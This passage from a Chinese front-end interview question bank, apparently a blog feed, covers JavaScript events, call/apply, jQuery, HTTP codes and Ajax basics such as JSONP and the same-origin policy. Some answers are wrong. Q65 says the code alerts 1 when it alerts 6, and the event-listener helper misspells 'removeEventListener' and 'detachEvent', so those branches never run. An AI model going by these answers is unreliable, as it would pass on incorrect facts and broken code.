newObj = object(oldObject);</span><br></pre></td></tr></table></figure><h2 id="48、事件、IE与火狐的事件机制有什么区别？-如何阻止冒泡？"><a href="#48、事件、IE与火狐的事件机制有什么区别？-如何阻止冒泡？" class="headerlink" title="48、事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？"></a>48、事件、IE与火狐的事件机制有什么区别？ 如何阻止冒泡？</h2><blockquote><p>我们在网页中的某个操作（有的操作对应多个事件）。<br>例如：当我们点击一个按钮就会产生一个事件。是可以被 JavaScript 侦测到的行为<br>事件处理机制：IE是事件冒泡、firefox同时支持两种事件模型，也就是：捕获型事件和冒泡型事件<br>ev.stopPropagation(); 注意旧ie的方法：ev.cancelBubble = true;</p></blockquote><h2 id="49、简述一下Sass、Less，且说明区别"><a href="#49、简述一下Sass、Less，且说明区别" class="headerlink" title="49、简述一下Sass、Less，且说明区别"></a>49、简述一下Sass、Less，且说明区别</h2><p>他们是动态的样式语言，是 CSS 预处理器, CSS 上的一种抽象层。他们是一种特殊的语法/语言而编译成CSS。</p><p>变量符不一样，less 是 @，而 Sass 是 $;</p><blockquote><p>Sass支持条件语句，可以使用 if{}else{}, for{} 循环等等。而 Less 不支持;<br>Sass是基于 Ruby 的，是在服务端处理的，而 Less 是需要引入 less.js 来处理 Less 代码输出 Css 到浏览器</p></blockquote><h2 id="50、关于javascript中apply-和call-方法的区别？"><a href="#50、关于javascript中apply-和call-方法的区别？" class="headerlink" title="50、关于javascript中apply()和call()方法的区别？"></a>50、关于javascript中apply()和call()方法的区别？</h2><blockquote><p>相同点:两个方法产生的作用是完全一样的<br>不同点:方法传递的参数不同<br>Object.call(this,obj1,obj2,obj3)<br>Object.apply(this,arguments)<br>apply()接收两个参数，一个是函数运行的作用域(this)，另一个是参数数组。<br>call()方法第一个参数与apply()方法相同，但传递给函数的参数必须列举出来。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">  alert(a+b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">  alert(a-b);</span><br><span class="line">&#125;</span><br><span class="line">add.call(sub,<span class="number">3</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>例子中用 add 来替换 sub，add.call(sub,3,1) == add(3,1) ，所以运行结果为：alert(4);</p><p>注意：js 中的函数其实是对象，函数名是对 Function 对象的引用。</p><h2 id="51、分别阐述split-slice-splice-join"><a href="#51、分别阐述split-slice-splice-join" class="headerlink" title="51、分别阐述split(),slice(),splice(),join()"></a>51、分别阐述split(),slice(),splice(),join()</h2><blockquote><p>join()用于把数组中的所有元素拼接起来放入一个字符串。所带的参数为分割字符串的分隔符，默认是以逗号分开。归属于Array<br>split()即把字符串分离开，以数组方式存储。归属于Stringstring<br>slice() 方法可从已有的数组中返回选定的元素。该方法并不会修改数组，而是返回一个子数组。如果想删除数组中的一段元素，应该使用方法 Array.splice()<br>splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。返回的是含有被删除的元素的数组。</p></blockquote><h2 id="52、事件委托"><a href="#52、事件委托" class="headerlink" title="52、事件委托"></a>52、事件委托</h2><p>让利用事件冒泡的原理，让自己的所触发的事件，让他的父元素代替执行！</p><h2 id="53、如何阻止事件冒泡和默认事件"><a href="#53、如何阻止事件冒泡和默认事件" class="headerlink" title="53、如何阻止事件冒泡和默认事件"></a>53、如何阻止事件冒泡和默认事件</h2><p>阻止浏览器的默认行为</p><blockquote><p>window.event?window.event.returnValue = false: e.preventDefault();</p></blockquote><p>停止事件冒泡</p><blockquote><p>window.event?window.event.cancelBubble = true:e.stopPropagation();</p></blockquote><p>原生的 和 jQuery 的</p><blockquote><p>原生JavaScript中，return false;只阻止默认行为，不阻止冒泡，<br>jQuery中的return false;既阻止默认行为，又阻止冒泡</p></blockquote><h2 id="54、require-js-有什么特性"><a href="#54、require-js-有什么特性" class="headerlink" title="54、require.js 有什么特性"></a>54、require.js 有什么特性</h2><blockquote><p>实现js文件的异步加载，避免网页失去响应；<br>管理模块之间的依赖性，便于代码的编写和维护。</p></blockquote><h2 id="55、谈一下JS中的递归函数，并且用递归简单实现阶乘？"><a href="#55、谈一下JS中的递归函数，并且用递归简单实现阶乘？" class="headerlink" title="55、谈一下JS中的递归函数，并且用递归简单实现阶乘？"></a>55、谈一下JS中的递归函数，并且用递归简单实现阶乘？</h2><p>递归即是程序在执行过程中不断调用自身的编程技巧，当然也必须要有一个明确的结束条件，不然就会陷入死循环。</p><h2 id="56、请用正则表达式写一个简单的邮箱验证"><a href="#56、请用正则表达式写一个简单的邮箱验证" class="headerlink" title="56、请用正则表达式写一个简单的邮箱验证"></a>56、请用正则表达式写一个简单的邮箱验证</h2><p><code>/^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\.[a-zA-Z0-9_-]+)+$/;</code></p><h2 id="57、简述一下你对web性能优化的方案"><a href="#57、简述一下你对web性能优化的方案" class="headerlink" title="57、简述一下你对web性能优化的方案"></a>57、简述一下你对web性能优化的方案</h2><blockquote><p>尽量减少 HTTP 请求<br>使用浏览器缓存<br>使用压缩组件<br>图片、JS的预载入<br>将脚本放在底部<br>将样式文件放在页面顶部<br>使用外部的JS和CSS<br>精简代码</p></blockquote><h2 id="58、在JS中有哪些会被隐式转换为false"><a href="#58、在JS中有哪些会被隐式转换为false" class="headerlink" title="58、在JS中有哪些会被隐式转换为false"></a>58、在JS中有哪些会被隐式转换为false</h2><blockquote><p>Undefined、null、关键字false、NaN、零、空字符串</p></blockquote><h2 id="59、定时器-setInterval-有一个有名函数-fn1，setInterval（fn1-500）与-setInterval（fn1-500）有什么区别"><a href="#59、定时器-setInterval-有一个有名函数-fn1，setInterval（fn1-500）与-setInterval（fn1-500）有什么区别" class="headerlink" title="59、定时器 setInterval 有一个有名函数 fn1，setInterval（fn1,500）与 setInterval（fn1(),500）有什么区别"></a>59、定时器 setInterval 有一个有名函数 fn1，setInterval（fn1,500）与 setInterval（fn1(),500）有什么区别</h2><p>第一个是重复执行每 500 毫秒执行一次，后面一个只执行一次。</p><h2 id="60、外部-JS-文件出现中文字符，会出现什么问题，怎么解决"><a href="#60、外部-JS-文件出现中文字符，会出现什么问题，怎么解决" class="headerlink" title="60、外部 JS 文件出现中文字符，会出现什么问题，怎么解决"></a>60、外部 JS 文件出现中文字符，会出现什么问题，怎么解决</h2><p>会出现乱码，加 <code>charset=&quot;GB2312&quot;;</code></p><h2 id="61、谈谈浏览器的内核，并且说一下什么是内核"><a href="#61、谈谈浏览器的内核，并且说一下什么是内核" class="headerlink" title="61、谈谈浏览器的内核，并且说一下什么是内核"></a>61、谈谈浏览器的内核，并且说一下什么是内核</h2><blockquote><p>Trident ([‘traɪd(ə)nt])–IE<br>Gecko ([‘gekəʊ])–Firefox<br>Presto ([‘prestəʊ])–opera<br>webkit—谷歌和Safari</p></blockquote><p>浏览器内核又可以分成两部分：渲染引擎和 JS 引擎。它负责取得网页的内容（HTML、XML、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。JS 引擎则是解析 Javascript 语言，执行 javascript 语言来实现网页的动态效果。</p><h2 id="62、写一个通用的事件侦听器函数"><a href="#62、写一个通用的事件侦听器函数" class="headerlink" title="62、写一个通用的事件侦听器函数"></a>62、写一个通用的事件侦听器函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// event(事件)工具集</span></span><br><span class="line">mhq.Event = &#123;</span><br><span class="line">  <span class="comment">// 页面加载完成后</span></span><br><span class="line">  readyEvent: <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (fn == <span class="literal">null</span>) &#123;</span><br><span class="line">      fn = <span class="built_in">document</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> oldonload = <span class="built_in">window</span>.onload;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.onload != <span class="string">'function'</span>) &#123;</span><br><span class="line">      <span class="built_in">window</span>.onload = fn;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        oldonload();</span><br><span class="line">        fn();</span><br><span class="line">      &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 视能力分别使用dom0||dom2||IE方式 来绑定事件</span></span><br><span class="line">  <span class="comment">// 参数： 操作的元素,事件名称 ,事件处理程序</span></span><br><span class="line">  addEvent: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.addEventListener) &#123;</span><br><span class="line">      <span class="comment">//事件类型、需要执行的函数、是否捕捉</span></span><br><span class="line">      element.addEventListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</span><br><span class="line">      element.attachEvent(<span class="string">'on'</span> + type, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        handler.call(element);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">'on'</span> + type] = handler;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 移除事件</span></span><br><span class="line">  removeEvent: <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (element.removeEnentListener) &#123;</span><br><span class="line">      element.removeEnentListener(type, handler, <span class="literal">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.datachEvent) &#123;</span><br><span class="line">      element.detachEvent(<span class="string">'on'</span> + type, handler);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      element[<span class="string">'on'</span> + type] = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  <span class="comment">// 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获)</span></span><br><span class="line">  stopPropagation: <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ev.stopPropagation) &#123;</span><br><span class="line">      ev.stopPropagation();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      ev.cancelBubble = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 取消事件的默认行为</span></span><br><span class="line">  preventDefault: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (event.preventDefault) &#123;</span><br><span class="line">      event.preventDefault();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      event.returnValue = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 获取事件目标</span></span><br><span class="line">  getTarget: <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> event.target || event.srcElement;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 获取event对象的引用，取到事件的所有信息，确保随时能使用event；</span></span><br><span class="line">  getEvent: <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ev = e || <span class="built_in">window</span>.event;</span><br><span class="line">    <span class="keyword">if</span> (!ev) &#123;</span><br><span class="line">      <span class="keyword">var</span> c = <span class="keyword">this</span>.getEvent.caller;</span><br><span class="line">      <span class="keyword">while</span> (c) &#123;</span><br><span class="line">        ev = c.arguments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (ev &amp;&amp; Event == ev.constructor) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        c = c.caller;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ev;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="63、如何判断一个对象是否属于某个类"><a href="#63、如何判断一个对象是否属于某个类" class="headerlink" title="63、如何判断一个对象是否属于某个类"></a>63、如何判断一个对象是否属于某个类</h2><p>使用instanceof （待完善）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(a <span class="keyword">instanceof</span> Person)&#123;</span><br><span class="line">  alert(<span class="string">'yes'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="64、模块化怎么做"><a href="#64、模块化怎么做" class="headerlink" title="64、模块化怎么做"></a>64、模块化怎么做</h2><p>立即执行函数,不暴露私有成员</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> module1 = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">var</span> m1 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">var</span> m2 = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    m1 : m1,</span><br><span class="line">    m2 : m2</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="65、告诉我答案是多少？"><a href="#65、告诉我答案是多少？" class="headerlink" title="65、告诉我答案是多少？"></a>65、告诉我答案是多少？</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line"><span class="keyword">delete</span> x;</span><br><span class="line">alert(x);</span><br><span class="line">&#125;)(<span class="number">1</span>+<span class="number">5</span>);</span><br></pre></td></tr></table></figure><p>函数参数无法 delete 删除，delete 只能删除通过 for in 访问的属性。当然，删除失败也不会报错，所以代码运行会弹出 1。</p><h2 id="66、Jquery-与-jQuery-UI-有啥区别？"><a href="#66、Jquery-与-jQuery-UI-有啥区别？" class="headerlink" title="66、Jquery 与 jQuery UI 有啥区别？"></a>66、Jquery 与 jQuery UI 有啥区别？</h2><blockquote><p>jQuery是一个js库，主要提供的功能是选择器，属性修改和事件绑定等等。<br>jQuery UI则是在jQuery的基础上，利用jQuery的扩展性，设计的插件。</p></blockquote><p>提供了一些常用的界面元素，诸如对话框、拖动行为、改变大小行为等等</p><h2 id="67、jquery-中如何将数组转化为json字符串，然后再转化回来"><a href="#67、jquery-中如何将数组转化为json字符串，然后再转化回来" class="headerlink" title="67、jquery 中如何将数组转化为json字符串，然后再转化回来"></a>67、jquery 中如何将数组转化为json字符串，然后再转化回来</h2><p>jQuery中没有提供这个功能，所以你需要先编写两个jQuery的扩展：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$.fn.stringifyArray = <span class="function"><span class="keyword">function</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">JSON</span>.stringify(array);</span><br><span class="line">&#125;</span><br><span class="line">$.fn.parseArray = <span class="function"><span class="keyword">function</span>(<span class="params">array</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">JSON</span>.parse(array);</span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// 然后调用：</span></span><br><span class="line">$(<span class="string">""</span>).stringifyArray(array);</span><br></pre></td></tr></table></figure><h2 id="68、http状态码有那些？分别代表是什么意思？"><a href="#68、http状态码有那些？分别代表是什么意思？" class="headerlink" title="68、http状态码有那些？分别代表是什么意思？"></a>68、http状态码有那些？分别代表是什么意思？</h2><blockquote><p>100-199 用于指定客户端应相应的某些动作。<br>200-299 用于表示请求成功。<br>300-399 用于已经移动的文件并且常被包含在定位头信息中指定新的地址信息。<br>400-499 用于指出客户端的错误。<br>400 语义有误，当前请求无法被服务器理解。<br>401 当前请求需要用户验证<br>403 服务器已经理解请求，但是拒绝执行它。<br>500-599 用于支持服务器错误。<br>503 – 服务不可用</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1、JQuery一个对象可以同时绑定多个事件，实现原理&quot;&gt;&lt;a href=&quot;#1、JQuery一个对象可以同时绑定多个事件，实现原理&quot; class=&quot;headerlink&quot; title=&quot;1、JQuery一个对象可以同时绑定多个事件，实现原理&quot;&gt;&lt;/a&gt;1、JQuery一个对象可以同时绑定多个事件，实现原理&lt;/h2&gt;&lt;p&gt;jQuery可以给一个对象同时绑定多个事件，低层实现方式是使用 addEventListner 或 attachEvent 兼容不同的浏览器实现事件的绑定，这样可以给同一个对象注册&lt;/p&gt;
&lt;h2 id=&quot;2、webkit、用浏览器的各种工具来调试和debug代码&quot;&gt;&lt;a href=&quot;#2、webkit、用浏览器的各种工具来调试和debug代码&quot; class=&quot;headerlink&quot; title=&quot;2、webkit、用浏览器的各种工具来调试和debug代码&quot;&gt;&lt;/a&gt;2、webkit、用浏览器的各种工具来调试和debug代码&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;Webkit是浏览器引擎，包括 html 渲染和 js 解析功能，手机浏览器的主流内核，与之相对应的引擎有 Gecko（Mozilla Firefox 等使用）和 Trident（也称MSHTML，IE 使用）。&lt;br&gt;对于浏览器的调试工具要熟练使用，主要是页面结构分析，后台请求信息查看，js 调试工具使用，熟练使用这些工具可以快速提高解决问题的效率&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="题库系列" scheme="http://yoursite.com/categories/%E9%A2%98%E5%BA%93%E7%B3%BB%E5%88%97/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
      <category term="JS" scheme="http://yoursite.com/tags/JS/"/>
    
  </entry>
  
  <entry>
    <title>题库-Ajax</title>
    <link href="http://yoursite.com/2016/06/18/%E9%A2%98%E5%BA%93-Ajax/"/>
    <id>http://yoursite.com/2016/06/18/题库-Ajax/</id>
    <published>2016-06-17T16:00:00.000Z</published>
    <updated>2018-06-05T06:59:53.397Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、Ajax-是什么-如何创建一个Ajax？"><a href="#1、Ajax-是什么-如何创建一个Ajax？" class="headerlink" title="1、Ajax 是什么? 如何创建一个Ajax？"></a>1、Ajax 是什么? 如何创建一个Ajax？</h2><blockquote><p>Ajax并不算是一种新的技术，全称是<code>asychronous javascript and xml</code>，可以说是已有技术的组合<br>主要用来实现客户端与服务器端的异步通信效果，实现页面的局部刷新<br>早期的浏览器并不能原生支持ajax，可以使用隐藏帧（iframe）方式变相实现异步效果<br>后来的浏览器提供了对ajax的原生支持<br>使用ajax原生方式发送请求主要通过 XMLHttpRequest(标准浏览器)、ActiveXObject(IE浏览器)对象实现异步通信效果</p></blockquote><p>基本步骤：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var xhr = null;//创建对象 </span><br><span class="line">if (window.XMLHttpRequest) &#123;</span><br><span class="line">  xhr = new XMLHttpRequest();</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  xhr = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;</span><br><span class="line">xhr.open(&quot;方式&quot;,&quot;地址&quot;,&quot;标志位&quot;);//初始化请求 </span><br><span class="line">xhr.setRequestHeader(&quot;&quot;,&quot;&quot;);//设置http头信息 </span><br><span class="line">xhr.onreadystatechange = function() &#123;&#125;//指定回调函数 </span><br><span class="line">xhr.send();//发送请求</span><br></pre></td></tr></table></figure><blockquote><p>js框架（jQuery/EXTJS等）提供的 ajax API对原生的ajax进行了封装，熟悉了基础理论，</p></blockquote><a id="more"></a><h2 id="2、同步和异步的区别"><a href="#2、同步和异步的区别" class="headerlink" title="2、同步和异步的区别"></a>2、同步和异步的区别</h2><p>同步：阻塞的</p><blockquote><p>张三叫李四去吃饭，李四一直忙得不停，张三一直等着，直到李四忙完两个人一块去吃饭<br>浏览器向服务器请求数据，服务器比较忙，浏览器一直等着（页面白屏），直到服务器返回数据，浏览器才能显示页面</p></blockquote><p>异步：非阻塞的</p><blockquote><p>张三叫李四去吃饭，李四在忙，张三说了一声然后自己就去吃饭了，李四忙完后自己去吃<br>浏览器向服务器请求数据，服务器比较忙，浏览器可以自如的干原来的事情（显示页面）服务器返回数据的时候通知浏览器一声，浏览器把返回的数据再渲染到页面，局部更新</p></blockquote><h2 id="3、如何解决跨域问题"><a href="#3、如何解决跨域问题" class="headerlink" title="3、如何解决跨域问题"></a>3、如何解决跨域问题</h2><p>理解跨域的概念：协议、域名、端口都相同才同域，否则都是跨域</p><blockquote><p>出于安全考虑，服务器不允许 ajax 跨域获取数据，但是可以跨域获取文件内容；<br>所以基于这一点，可以动态创建 script 标签，使用标签的 src 属性访问 js 文件的形式获取 js 脚本；<br>这个 js 脚本中的内容是函数调用，该函数调用的参数是服务器返回的数据；<br>为了获取这里的参数数据，需要事先在页面中定义回调函数；<br>在回调函数中处理服务器返回的数据，这就是解决跨域问题的主流解决方案</p></blockquote><h2 id="4、页面编码和被请求的资源编码如果不一致如何处理"><a href="#4、页面编码和被请求的资源编码如果不一致如何处理" class="headerlink" title="4、页面编码和被请求的资源编码如果不一致如何处理"></a>4、页面编码和被请求的资源编码如果不一致如何处理</h2><blockquote><p>对于ajax请求传递的参数，如果是get请求方式，参数如果传递中文;<br>在有些浏览器会乱码，不同的浏览器对参数编码的处理方式不同；<br>所以对于 get 请求的参数需要使用 encodeURIComponent 函数对参数进行编码处理；<br>后台开发语言都有相应的解码 api；<br>对于 post 请求不需要进行编码。</p></blockquote><h2 id="5、简述-ajax-的过程"><a href="#5、简述-ajax-的过程" class="headerlink" title="5、简述 ajax 的过程"></a>5、简述 ajax 的过程</h2><blockquote><p>创建 XMLHttpRequest 对象,也就是创建一个异步调用对象<br>创建一个新的 HTTP 请求,并指定该HTTP请求的方法、URL 及验证信息<br>设置响应 HTTP 请求状态变化的函数<br>发送 HTTP 请求<br>获取异步调用返回的数据<br>使用 JavaScript 和 DOM 实现局部刷新</p></blockquote><h2 id="6、异步加载"><a href="#6、异步加载" class="headerlink" title="6、异步加载"></a>6、异步加载</h2><blockquote><p>异步加载的方案： 动态插入 script 标签<br>通过 ajax 去获取 js 代码，然后通过 eval 执行<br>script 标签上添加 defer 或者 async 属性<br>创建并插入 iframe，让它异步执行 js</p></blockquote><h2 id="7、JavaScript-的同源策略。"><a href="#7、JavaScript-的同源策略。" class="headerlink" title="7、JavaScript 的同源策略。"></a>7、JavaScript 的同源策略。</h2><blockquote><p>同源策略是客户端脚本（尤其是Javascript）的重要的安全度量标准。<br>它最早出自Netscape Navigator2.0，其目的是防止某个文档或脚本从多个不同源装载。<br>所谓同源指的是：协议，域名，端口相同，同源策略是一种安全协议，指一段脚本只能读取来自同一来源的窗口和文档的属性。</p></blockquote><h2 id="8、GET-和-POST-的区别，何时使用-POST"><a href="#8、GET-和-POST-的区别，何时使用-POST" class="headerlink" title="8、GET 和 POST 的区别，何时使用 POST"></a>8、GET 和 POST 的区别，何时使用 POST</h2><blockquote><p>GET：一般用于信息获取，使用URL传递参数，对所发送信息的数量也有限制，一般在2000个字符，有的浏览器是8000个字符<br>POST：一般用于修改服务器上的资源，对所发送的信息没有限制</p></blockquote><p>在以下情况中，请使用 POST 请求：</p><blockquote><p>无法使用缓存文件（更新服务器上的文件或数据库）<br>向服务器发送大量数据（POST 没有数据量限制）<br>发送包含未知字符的用户输入时，POST 比 GET 更稳定也更可靠</p></blockquote><h2 id="9、ajax-是什么-ajax-的交互模型-同步和异步的区别-如何解决跨域问题"><a href="#9、ajax-是什么-ajax-的交互模型-同步和异步的区别-如何解决跨域问题" class="headerlink" title="9、ajax 是什么 ajax 的交互模型 同步和异步的区别 如何解决跨域问题"></a>9、ajax 是什么 ajax 的交互模型 同步和异步的区别 如何解决跨域问题</h2><blockquote><p>通过异步模式，提升了用户体验<br>优化了浏览器和服务器之间的传输，减少不必要的数据往返，减少了带宽占用<br>Ajax在客户端运行，承担了一部分本来由服务器承担的工作，减少了大用户量下的服务器负载。</p></blockquote><h2 id="10、-Ajax的最大的特点是什么。"><a href="#10、-Ajax的最大的特点是什么。" class="headerlink" title="10、 Ajax的最大的特点是什么。"></a>10、 Ajax的最大的特点是什么。</h2><blockquote><p>Ajax可以实现异步通信效果，实现页面局部刷新，带来更好的用户体验；按需获取数据，节约带宽资源；</p></blockquote><h2 id="11、ajax的缺点"><a href="#11、ajax的缺点" class="headerlink" title="11、ajax的缺点"></a>11、ajax的缺点</h2><blockquote><p>ajax不支持浏览器back按钮。<br>安全问题 AJAX暴露了与服务器交互的细节。<br>对搜索引擎的支持比较弱。<br>破坏了程序的异常机制。</p></blockquote><h2 id="12、ajax-请求的时候-get-和-post-方式的区别"><a href="#12、ajax-请求的时候-get-和-post-方式的区别" class="headerlink" title="12、ajax 请求的时候 get 和 post 方式的区别"></a>12、ajax 请求的时候 get 和 post 方式的区别</h2><blockquote><p>get 一般用来进行查询操作，url 地址有长度限制，请求的参数都暴露在 url 地址当中，如果传递中文参数，需要自己进行编码操作，安全性较低。<br>post 请求方式主要用来提交数据，没有数据长度的限制，提交的数据内容存在于 http 请求体中，数据不会暴漏在 url 地址中。</p></blockquote><h2 id="13、解释jsonp的原理，以及为什么不是真正的ajax"><a href="#13、解释jsonp的原理，以及为什么不是真正的ajax" class="headerlink" title="13、解释jsonp的原理，以及为什么不是真正的ajax"></a>13、解释jsonp的原理，以及为什么不是真正的ajax</h2><p>Jsonp并不是一种数据格式，而json是一种数据格式，jsonp是用来解决跨域获取数据的一种解决方案，具体是通过动态创建script标签，然后通过标签的src属性获取js文件中的js脚本，该脚本的内容是一个函数调用，参数就是服务器返回的数据，为了处理这些返回的数据，需要事先在页面定义好回调函数，本质上使用的并不是ajax技术</p><h2 id="14、什么是-Ajax-和-JSON-，它们的优缺点"><a href="#14、什么是-Ajax-和-JSON-，它们的优缺点" class="headerlink" title="14、什么是 Ajax 和 JSON ，它们的优缺点"></a>14、什么是 Ajax 和 JSON ，它们的优缺点</h2><blockquote><p>Ajax是全称是asynchronous JavaScript 